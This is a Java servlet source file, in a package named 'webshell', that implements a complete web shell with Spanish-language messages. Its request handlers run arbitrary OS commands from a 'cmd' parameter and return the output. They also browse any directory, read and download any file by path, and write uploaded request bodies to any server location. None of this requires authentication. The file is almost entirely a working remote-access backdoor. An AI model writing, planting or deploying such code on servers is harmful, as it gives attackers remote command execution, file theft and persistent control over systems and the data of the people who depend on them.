package com.jrsolutions.web.webshell;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.Reader;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
//import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
//import javax.servlet.http.Part;

/**
 * Servlet implementation class Main
 */
//@WebServlet("/Main")
public class Main extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
	
	private File currentDir;
	private String urlPath;
	private String urlName;
    /**
     * @see HttpServlet#HttpServlet()
     */
    public Main() {
        super();
        // TODO Auto-generated constructor stub
    }


	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		upload(request, response);
	}
	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		//response.getWriter().append("Served at: ").append(request.getContextPath());
		
		urlPath=request.getContextPath();
		urlName=request.getServletPath();
		String fileName=request.getParameter("dowload");
		if(fileName!=null){
			sendFile(fileName,response);
		}
		String cmd =request.getParameter("cmd");
		if(cmd!=null){
			executeCmd(cmd,response);
		}
		String dir =request.getParameter("dir");
		if(dir!=null){
			listDirectory(dir, response);
		}
		String tail =request.getParameter("tail");
		if(tail!=null){
			openFile(tail, response);
		}
		String ver =request.getParameter("ver");
		if(ver!=null){
			viewFile(ver, response);
		}
		String open =request.getParameter("open");
		if(open!=null){
			openFile(open, response);
		}
		String upload =request.getParameter("upload");
		if(upload!=null){
			upload(request, response);
		}

	}
	
	private void sendFile(String fileName,HttpServletResponse response) throws IOException{
		log("Descargando ... "+fileName);

		
		ServletOutputStream out=response.getOutputStream();
		
		File f=new File(fileName);
		if(f.exists() ){
			if(f.canRead() ){
				if(f.isDirectory()){
					listDirectory(f,response);
				}
				if(f.isFile()){
					sendOneFile(f,response);
				}
			}else{
				sendError("No puedo leer el fichero",response);
			}
		}else{
			sendError("No puedo encontrar el fichero",response);
		}
		out.close();
	}
	
	private void listDirectory(String dirName,HttpServletResponse response) throws IOException{
		ServletOutputStream out=response.getOutputStream();
		response.setContentType("text/html");
		out.println("<html><head><title>List Dir:"+dirName+"</title></head><body>");
		
		out.println("<h2>"+dirName+"</h2><hr>");
		
		File dir;
		if(dirName==null){
			out.println("<h3>No has pasado el directorio</h3>");
		}else{
			dir=new File(dirName);
			if(dir.isAbsolute()){
				//currentDir=dir;
			}else{
				dir=new File(currentDir,dirName);
			}
			
			if(!dir.exists()){
				out.println("<h3>No existe el directorio</h3>");
			}else if(!dir.canRead()){
				out.println("<h3>No lo puedo leer</h3>");
			}else{
				currentDir=dir;
				if(dir.isDirectory()){
					listDirectory(dir,response);
				}	
				if(dir.isFile()){
					listFile(dir,response);
				}
			}
		}
		out.println("</body></html>");
		out.close();
	}
	
	private void listFile(File dir,HttpServletResponse response) throws IOException{
	}
	
	private void listDirectory(File dir,HttpServletResponse response) throws IOException{
		ServletOutputStream out=response.getOutputStream();
		List<File> items=Arrays.asList(dir.listFiles());
		Collections.sort(items,new Comparator<File>(){

			@Override
			public int compare(File f1, File f2) {
				if(f1.isDirectory()&& !f2.isDirectory()) return -1;
				if(f2.isDirectory()&& !f1.isDirectory()) return 1;
				return f1.getName().compareTo(f2.getName());
			}
			
		});
		
	
		File parentDir=dir.getParentFile();
		if(parentDir==null){
			parentDir=dir.getCanonicalFile();
			parentDir=dir.getAbsoluteFile();
		}
		out.println("<h3>"+urlPath+" -- "+urlName+"</h3><br/>");
		out.println("<h3> Listando :"+dir.getPath()+"</h3><br/>");
		
		out.println("<table>");
		out.println(String.format("<tr><td></td><td></td><td>parent -%s-</td><td><a href='%s'> ir </a></td></tr>",
				parentDir,
				//urlPath+urlName+"?dir="+parentDir+File.separator+(parentDir.getName().isEmpty()?parentDir.getPath():parentDir.getName())
				urlPath+urlName+"?dir="+parentDir.getPath()
				));
		for (File f :items){	
			
			if(f.isDirectory()){
				out.println(String.format("<tr><td>%s%s%s</td><td></td><td>%40s</td><td><a href='%s'> ir </a></td></tr>",
						f.canRead()?"R":"-",
						f.canWrite()?"W":"-",
						f.canExecute()?"X":"-",
						(f.getName().isEmpty()?f.getPath():f.getName()),
						urlPath+urlName+"?dir="+(dir!=null?dir+File.separator:"")+(f.getName().isEmpty()?f.getPath():f.getName())
						));
			}
			
			if(f.isFile()){
				out.println(String.format("<tr><td>%s%s%s</td><td>%d</td><td>%40s</td><td> <a href='%s'>ver</a>  <a href='%s'>tail</a>  <a href='%s'>descargar</a>  <a href='%s'>open</a> </td></tr>",
					f.canRead()?"R":"-",
					f.canWrite()?"W":"-",
					f.canExecute()?"X":"-",
					f.length(),
					(f.getName().isEmpty()?f.getPath():f.getName()),
					urlPath+urlName+"?ver="+(dir!=null?dir+File.separator:"")+(f.getName().isEmpty()?f.getPath():f.getName()),
					urlPath+urlName+"?tail="+(dir!=null?dir+File.separator:"")+(f.getName().isEmpty()?f.getPath():f.getName()),
					urlPath+urlName+"?download="+(dir!=null?dir+File.separator:"")+(f.getName().isEmpty()?f.getPath():f.getName()),
					urlPath+urlName+"?open="+(dir!=null?dir+File.separator:"")+(f.getName().isEmpty()?f.getPath():f.getName())
					
					));
			}
		}
		out.println("</table>");
		out.println("<hr>");
		


	}
	
	private void sendOneFile(File f,HttpServletResponse response) throws IOException{
		
		response.setContentType("application/octet-stream");  //text/plain
		ServletOutputStream out=response.getOutputStream();
		
		FileInputStream in=new FileInputStream(f);
		int BUFFER_SIZE=9102;
		int byteCount = 0;
		byte[] buffer = new byte[BUFFER_SIZE];
		int bytesRead = -1;
		while ((bytesRead = in.read(buffer)) > 0) {
			out.write(buffer, 0, bytesRead);
			byteCount += bytesRead;
		}
		in.close();
		out.close();
		
		log("Enviados "+byteCount+" bytes");
	}
	
	private void openFile(String fileName,HttpServletResponse response) throws IOException{
		
		response.setContentType("text/plain");
		File f=new File(fileName);
		
		PrintWriter out=response.getWriter();
	
		Reader in=new FileReader(f);
		int BUFFER_SIZE=9102;
		int byteCount = 0;
		char[] buffer = new char[BUFFER_SIZE];
		int bytesRead = -1;
		while ((bytesRead = in.read(buffer,0,BUFFER_SIZE)) > 0) {
			out.write(buffer, 0, bytesRead);
			byteCount += bytesRead;
		}
		in.close();
		
		out.close();
		log("Enviados "+byteCount+" chars");
	}
	
	private void viewFile(String fileName,HttpServletResponse response) throws IOException{
			
		File f=new File(fileName);
		
		PrintWriter out=response.getWriter();
	
		out.println("<html><header><title>"+ "ver"+"</title></header><body>");
		
		out.println("<h1>"+ "volcar fichero"+"</h1><hr>");
	
		Reader in=new FileReader(f);
		int BUFFER_SIZE=9102;
		int byteCount = 0;
		char[] buffer = new char[BUFFER_SIZE];
		int bytesRead = -1;
		while ((bytesRead = in.read(buffer,0,BUFFER_SIZE)) > 0) {
			out.write(buffer, 0, bytesRead);
			byteCount += bytesRead;
		}
		in.close();
		
		out.println("<hr>Total "+byteCount+" bytes </boyd></html>");
		out.close();
		log("Enviados "+byteCount+" chars");
	}
	
	private void sendError(String msg,HttpServletResponse response) throws IOException{
		ServletOutputStream out=response.getOutputStream();
		response.setContentType("text/html");
		response.setStatus(400);
		out.println("<html><head><title>Hola</title></head><body>");
		
		out.println("Error ... "+msg);
		
		out.println("</body></html>");

	}
	

	
	private void executeCmd(String cmd,HttpServletResponse response) throws IOException{
		ServletOutputStream out=response.getOutputStream();
		response.setContentType("text/html");
		out.println("<html><head><title>Hola</title></head><body>");
		
		String osName=System.getProperty("os.name");
		out.println("Ejecutado desde "+currentDir+"<br/>");
		out.println("os Arch:"+System.getProperty("os.arch")+"<br/>");
		out.println("os Name:"+System.getProperty("os.name")+"<br/>");
		out.println("os Ver:"+System.getProperty("os.version")+"<br/><hr/><pre>");
		
		if(currentDir==null){
			currentDir=new File(System.getProperty("user.dir"));  // user.home
		}
		String shell;
		String allCmd;
		if(osName.toUpperCase().matches(".*WINDOWS.*")){
			shell="c:\\\\Windows\\system32\\cmd.exe /c ";
			allCmd=shell+"\""+cmd+"\"";
		}else{
			//shell="/bin/sh ";
			shell="";
			allCmd=shell+" "+cmd+" ";
		}
		long t=System.nanoTime();
		
		log("COMMAND:["+allCmd+"]");
		Process p=Runtime.getRuntime().exec(allCmd);
		OutputStream outProcess=p.getOutputStream();
		InputStream errProcess=p.getErrorStream();
		InputStream inProcess=p.getInputStream();
		
		
		BufferedReader is=new BufferedReader(new InputStreamReader(inProcess));
		String line;
		while( (line=is.readLine())!=null){
			String line2=line.replaceAll("<","&lt") ;
			out.println(line2);
		}
		is.close();
		inProcess.close();
		
		out.println("</pre><hr>Error:<hr><pre>");
		BufferedReader is2=new BufferedReader(new InputStreamReader(errProcess));
		while( (line=is2.readLine())!=null){
			String line2=line.replaceAll("<","&lt");
			out.println(line2);
		}
		is2.close();
		errProcess.close();
		
		out.println("</pre><br>");
		
		try {
			int ret=p.waitFor();
			out.println(" Retorno:"+ret);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		int r=p.exitValue();
		out.println(" Resultado:"+r);
		out.println(" Tiempo:"+(System.nanoTime()-t)/1e9);
		out.println(" Salida:<hr><pre>");
		
		
		
		out.println("</body></html>");
		out.close();
		log("FIN");
	}

	
	
	
	protected void upload(HttpServletRequest request,
	        HttpServletResponse response)
	        throws ServletException, IOException {
	    response.setContentType("text/html;charset=UTF-8");

	    // Create path components to save the file
	    final String path = request.getParameter("destination");
	   // final Part filePart = request.getPart("file");
	    
	    final String fileName;
//	    if(filePart==null){
	    	fileName=path;
//	    }else{
//	    	fileName = getFileName(filePart);
//	    }

	    OutputStream out = null;
	    InputStream filecontent = null;
	    final PrintWriter writer = response.getWriter();

	    try {
	       // out = new FileOutputStream(new File(path + File.separator
	       //         + fileName));
	        out = new FileOutputStream(new File(path));
//	        if(filePart!=null){
//	        	filecontent = filePart.getInputStream();
//	        }else{
	        	filecontent = request.getInputStream();
//	        }

	        int read = 0;
	        final byte[] bytes = new byte[1024];

	        int count=0;
	        while ((read = filecontent.read(bytes)) != -1) {
	        	count+=read;
	            out.write(bytes, 0, read);
	        }
	        log("Leidos "+count+" bytes");
	        writer.println("New file " + fileName + " created at " + path);
	        log( String.format("File{0}being uploaded to {1}", 
	                new Object[]{fileName, path}));
	    } catch (FileNotFoundException fne) {
	        writer.println("No puedo crear el fichero '"+path+"' en el servidor");
	        writer.println("<br/> ERROR: " + fne.getMessage());

	        log( String.format("Problems during file upload. Error: "+fne.getLocalizedMessage()));
	    } finally {
	        if (out != null) {
	            out.close();
	        }
	        if (filecontent != null) {
	            filecontent.close();
	        }
	        if (writer != null) {
	            writer.close();
	        }
	    }
	}

	/*private String getFileName(final Part part) {
	    final String partHeader = part.getHeader("content-disposition");
	    log( String.format("Part Header = {0}", partHeader));
	    for (String content : part.getHeader("content-disposition").split(";")) {
	        if (content.trim().startsWith("filename")) {
	            return content.substring(
	                    content.indexOf('=') + 1).trim().replace("\"", "");
	        }
	    }
	    return null;
	}*/

	@Override
	protected void doPut(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
		upload(req, resp);
	}
	
	


}
